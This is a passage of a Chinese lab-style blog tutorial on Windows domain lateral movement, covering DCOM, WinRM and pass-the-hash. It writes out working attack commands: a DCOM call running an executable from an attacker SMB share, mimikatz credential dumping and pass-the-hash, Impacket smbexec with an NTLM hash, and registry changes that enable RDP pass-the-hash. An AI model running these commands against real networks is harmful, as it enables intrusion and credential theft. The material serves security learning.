+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207202909382.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230207202909382</span></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Item</span>()<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c \\192.168.232.152\evilsmb\hobbyhorse_x64.exe&quot;</span>, <span class="hljs-string">&quot;C:\Windows\System32&quot;</span>, <span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207202953150.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230207202953150</span></p>
+<p><font color='red'>总结</font></p>
+<p>不同与MMC20.Application的是，ShellWindows并不会创建新进程，而是在已有的explorer.exe进程中创建并且执行子进程</p>
+<h3 id="ShellBrowserWindow"><a href="#ShellBrowserWindow" class="headerlink" title="ShellBrowserWindow"></a>ShellBrowserWindow</h3><p>同ShellWindows一样，也是调用Document.Application.ShellExecute方法，在explorer.exe进程下创建子进程</p>
+<p>不同的是</p>
+<p><strong><font color='red'>它只适用于windows 10和windows server 2012</font></strong></p>
+<h1 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用"></a>WinRM的利用</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>WinRM是通过一个叫WS-Management协议，来实现远程管理的</p>
+<p>WS-Management协议</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">用来进行远程软硬件管理的web服务协议<br><br>在同一个网络内，允许两台计算机相互通信<br><br>对应5985端口<br></code></pre></td></tr></table></figure>
+
+<p>只要启动了服务，防火墙就会放行对应的端口，不会阻拦</p>
+<p><font color='red'>在windows server 2008以上WinRM是默认开启的</font></p>
+<p><font color='red'>Win7系统中却默认安装此WinRM服务，但是默认为禁用状态，Win8系统和Win10系统也都默认关闭WinRM服务</font></p>
+<p>需要管理员的凭据</p>
+<h2 id="通过WinRM执行远程命令"><a href="#通过WinRM执行远程命令" class="headerlink" title="通过WinRM执行远程命令"></a>通过WinRM执行远程命令</h2><p>要用到两个工具winrs、winrm</p>
+<p><font color='red'>在首次用到这两个工具时，需要设置信任</font></p>
+<p>将目标ip设置为信任ip，添加到信任列表</p>
+<p><font color='red'>设置信任列表的前提是需要把跳板机网络连接改为专用网络，否则无法开启</font>（这一点在本地测试时要注意，但是在实际的环境中，一般都是域，无需过多注意）</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#打开WinRM服务</span><br>winrm quickconfig -q<br><br><span class="hljs-comment">#cmd设置</span><br>winrm <span class="hljs-built_in">set</span> winrm/config<span class="hljs-built_in">/client </span>@&#123;<span class="hljs-attribute">TrustedHosts</span>=<span class="hljs-string">&quot;ip地址&quot;</span>&#125;<br><br><span class="hljs-comment">#powershell设置</span><br>Set-Item WSMan:localhost\client\trustedhosts -value *<br><br>其中IP地址可以设置为*，表示信任任何ip<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="winrs"><a href="#winrs" class="headerlink" title="winrs"></a>winrs</h3><p>winrs是WinRM提供的客户端程序，在双方都开启WinRM服务的前提下，可以远程执行命令</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">232.137</span>:<span class="hljs-number">5985</span> -u:administrator -p:admin <span class="hljs-string">&quot;whoami&quot;</span><br><br><span class="hljs-comment">#也可以运行cmd</span><br>winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">232.137</span>:<span class="hljs-number">5985</span> -u:administrator -p:admin <span class="hljs-string">&quot;cmd&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>微软官方给出的建议</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>learn.microsoft.com<span class="hljs-regexp">/zh-cn/</span>troubleshoot<span class="hljs-regexp">/windows-client/</span>system-management-components/errors-when-you-run-winrm-commands<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207231306921.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230207231306921</span></p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208190054019.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230208190054019</span></p>
+<h3 id="winrm-cmd"><a href="#winrm-cmd" class="headerlink" title="winrm.cmd"></a>winrm.cmd</h3><p>winrm.cmd运行WMI对象通过WinRM传输进行远程交互，在本地或者远程计算机上枚举WMI对象实例或调用WMI类方法</p>
+<p>调用WMI的win32_process类中的create方法来创建进程</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>Create wmicimv2/Win32_Process @&#123;CommandLine=<span class="hljs-string">&quot;calc.exe&quot;</span>&#125; -r:http://192.168.8.1:5985 -u:administrator -p:ADMIN!@<span class="hljs-comment">#45</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208191821182.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230208191821182</span></p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208191918882.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230208191918882</span></p>
+<h2 id="WinRM获取交互式会话"><a href="#WinRM获取交互式会话" class="headerlink" title="WinRM获取交互式会话"></a>WinRM获取交互式会话</h2><p>powershell的远程传输协议是基于WinRM的</p>
+<p>Enter-PSSession的PowerShell Cmdlet可以启动和远程主机的会话</p>
+<p>创建会话</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#远程用户名</span><br><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;administrator&quot;</span><br><br><span class="hljs-comment">#用户密码</span><br><span class="hljs-variable">$Password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;ADMIN!@#45&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-comment">#将用户名和密码整合，以便导入credential</span><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><br><span class="hljs-comment">#创建会话</span><br><span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-Name</span> Test <span class="hljs-literal">-ComputerName</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">5985</span><br><span class="hljs-comment">#-Name是创建会话的命名</span><br><span class="hljs-comment">#-ComputerName是目标主机，可以是ip，也可以是主机名字</span><br><span class="hljs-comment">#-Credential是整合的凭据</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208194112653.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230208194112653</span></p>
+<p>查看存在的所有会话</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-PSSession</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208194357863.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230208194357863</span></p>
+<p>选择会话</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">Enter</span>-PSSession -Name <span class="hljs-keyword">Test</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208194459781.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230208194459781</span></p>
+<p>这样就成功了</p>
+<p>也可以使用Invoke-Command</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span><br><br><span class="hljs-variable">$Password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;ADMIN!@#45&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><br><span class="hljs-variable">$Sess</span> = <span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-Name</span> Test1 <span class="hljs-literal">-ComputerName</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">5985</span><br><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Session</span> <span class="hljs-variable">$Sess</span> <span class="hljs-literal">-ScriptBlock</span> &#123;whoami&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208195219772.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230208195219772</span></p>
+<p>成功</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用WinRM进行横向移动，最出色的地方在于，服务是windows自己提供的，开启服务就不会被防火墙拦截</p>
+<p>其次是所利用的工具组件，都是Windows自带的，不用做免杀，除非EDR拦截了winrs.exe</p>
+<h1 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h1><p>在windows server 2000之后，在windows中密码都用hash值保存，想要获取明文密码是比较困难的</p>
+<p>获取到hash值密码之后，想要得到明文，是比较困难的，因为hash算法是一个单向的算法，不可逆</p>
+<p>但是</p>
+<p>hash值也是可以暴力破解的</p>
+<h2 id="哈希传递攻击的利用"><a href="#哈希传递攻击的利用" class="headerlink" title="哈希传递攻击的利用"></a>哈希传递攻击的利用</h2><p>主要是mimikatz和impacket工具包里面的工具</p>
+<p>其次就是crackmapexec、powershell、evil-winrm、metasploit框架工具等等</p>
+<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><p>需要具备本地管理员权限</p>
+<p>地址</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gentilkiwi/mimi</span>katz<br></code></pre></td></tr></table></figure>
+
+<p>首先需要将mimikatz上传到目标主机</p>
+<p>然后执行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+
+<p>得到本地主机的管理员账户hash值</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208211118148.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230208211118148</span></p>
+<p>再进行尝试进行传递，可能其他主机也是这个密码</p>
+<p><strong>就是碰运气去试账号密码</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:administrator /domain:sayms /ntlm:5b56663cfe976a8b6a841ff7c1abcee1&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><p>常用的几个是psexec.py、smbexec.py、wmiexec.py</p>
+<p>当然如果跳板机有python环境就不错，如果没有，可以把python文件打包为exe文件，也是可以执行的</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">#打包<span class="hljs-keyword">python</span>文件为<span class="hljs-keyword">exe</span><br><br>pip install pyinstaller<br><br><span class="hljs-keyword">cd</span> impacket\examples<br><br>pyinstaller -F wmiexec.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>也可以通过内网代理技术，代理到kali</p>
+<p>以smbexec.py为例，其他两个的用法大同小异</p>
+<h4 id="smbexec-py"><a href="#smbexec-py" class="headerlink" title="smbexec.py"></a>smbexec.py</h4><p>打包为exe文件</p>
+<p>exe文件地址</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">impacket-<span class="hljs-literal">master</span>\examples\dist<br></code></pre></td></tr></table></figure>
+
+
+
+<p>使用</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">smbexec</span>.exe -hashes :<span class="hljs-number">5</span>b56663cfe976a8b6a841ff7c1abcee1 sayms/administrator@<span class="hljs-number">192.168.8.1</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208214117812.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230208214117812</span></p>
+<p><strong><font color='red'>就算开启防火墙，也是可以进行使用的</font></strong></p>
+<h2 id="哈希传递登陆远程桌面"><a href="#哈希传递登陆远程桌面" class="headerlink" title="哈希传递登陆远程桌面"></a>哈希传递登陆远程桌面</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>远程主机开启了“受限管理员模式”</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">windows</span> server <span class="hljs-number">2012</span><span class="hljs-built_in">r2</span>及其以上版本支持受限管理员模式<br>开启此模式，可以使用hash值进行远程登录，不需要明文密码<br><br>此模式在win8.<span class="hljs-number">1</span>和windows server <span class="hljs-number">2012</span><span class="hljs-built_in">r2</span>中默认开启<br></code></pre></td></tr></table></figure>
+
+
+
+<p>使用的用户凭据处于管理员组</p>
+<p>hash值</p>
+<h3 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h3><p>开启受限管理员模式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查询是否开启，结果为0，表示启动</span><br>reg query <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin<br><br><span class="hljs-comment">#开启命令</span><br>reg add <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f<br></code></pre></td></tr></table></figure>
+
+
+
+<p>开启之后，使用mimikatz进行hash传递，然后执行“mstsc.exe /restrictedadmin”</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:administrator /domain:sayms /ntlm:5b56663cfe976a8b6a841ff7c1abcee1&quot;</span> <span class="hljs-string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="远程执行漏洞"><a href="#远程执行漏洞" class="headerlink" title="远程执行漏洞"></a>远程执行漏洞</h1><p>一些远程执行漏洞，也可以用来横向</p>
+<p>比如</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">永恒之蓝 ms17<span class="hljs-string">-010</span><br><br>cve<span class="hljs-string">-2019</span><span class="hljs-string">-0708</span><br><br>ms08<span class="hljs-string">-067</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+      </section>
+      <section class="extra">
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" rel="tag">内网学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%A8%AA%E5%90%91/" rel="tag">域横向</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2023/03/02/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/"><i class="iconfont iconleft"></i>端口转发与内网代理</a>
+    <a></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E5%A6%82%E4%BD%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-text">横向移动中如何文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB"><span class="toc-text">网络共享</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-text">操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84IPC%E5%91%BD%E4%BB%A4"><span class="toc-text">常用的IPC命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">SMB服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E8%87%AA%E5%B8%A6%E5%B7%A5%E5%85%B7"><span class="toc-text">windows自带工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#certutil"><span class="toc-text">certutil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BITSAdmin"><span class="toc-text">BITSAdmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell"><span class="toc-text">powershell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">创建计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E5%A4%B1%E8%B4%A5"><span class="toc-text">实操失败</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E6%88%90%E5%8A%9F"><span class="toc-text">实操成功</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UNC%E8%B7%AF%E5%BE%84%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C"><span class="toc-text">UNC路径加载执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UNC%E8%B7%AF%E5%BE%84"><span class="toc-text">UNC路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-1"><span class="toc-text">操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-text">利用系统服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1"><span class="toc-text">创建远程服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SCShell"><span class="toc-text">SCShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-text">实操</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%88%A9%E7%94%A8"><span class="toc-text">远程桌面利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-text">判断是否开启远程桌面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP-Hijacking-%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8A%AB%E6%8C%81%EF%BC%89"><span class="toc-text">RDP Hijacking （远程桌面劫持）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SharpRDP"><span class="toc-text">SharpRDP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PsExec"><span class="toc-text">PsExec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%8A%BF"><span class="toc-text">优势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-2"><span class="toc-text">操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WMI"><span class="toc-text">WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">常规利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-text">常见利用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec"><span class="toc-text">wmiexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Invoke-WmiCommand"><span class="toc-text">Invoke-WmiCommand</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">WMI事件订阅的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%88%A9%E7%94%A8"><span class="toc-text">手动利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sharp-WMIEvent"><span class="toc-text">Sharp-WMIEvent</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DCOM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">DCOM的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#COM%E5%92%8CDCOM"><span class="toc-text">COM和DCOM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCOM%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-text">DCOM横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MMC20-Application"><span class="toc-text">MMC20.Application</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ShellWindows"><span class="toc-text">ShellWindows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ShellBrowserWindow"><span class="toc-text">ShellBrowserWindow</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WinRM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">WinRM的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-2"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87WinRM%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4"><span class="toc-text">通过WinRM执行远程命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#winrs"><span class="toc-text">winrs</span></a></li><li 